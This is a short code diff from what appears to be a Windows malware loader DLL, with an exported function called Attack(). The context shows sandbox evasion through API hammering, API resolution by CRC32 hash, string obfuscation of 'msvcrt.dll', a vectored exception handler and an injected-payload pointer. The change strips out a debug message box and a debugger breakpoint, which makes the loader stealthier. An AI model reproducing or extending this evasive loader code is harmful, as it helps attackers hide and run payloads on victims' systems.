@@ -16,7 +16,6 @@ extern __declspec(dllexport) int Attack()
     PVOID        pVehHandler            = NULL;
     PVOID       pInjectedPayload    = NULL;
 
-
     ApiHammering(1000);
 
     if (pPayload == NULL || sSize == NULL)
@@ -78,8 +77,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
             HANDLE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
             pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernel32_handle, LoadLibraryA_CRC32);
 
-            MessageBoxA(NULL, "Hello", "Hello", MB_OK);
-            __debugbreak();
+            // MessageBoxA(NULL, "Hello", "Hello", MB_OK);
+
             CHAR msvcrt_dll[] = {'m', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0};
             apis.handles.mscvtdll = pLoadLibraryA(msvcrt_dll);
             apis.msvcrt.memset = (_MEMSET)GetProcAddressH(apis.handles.mscvtdll, memset_CRC32);
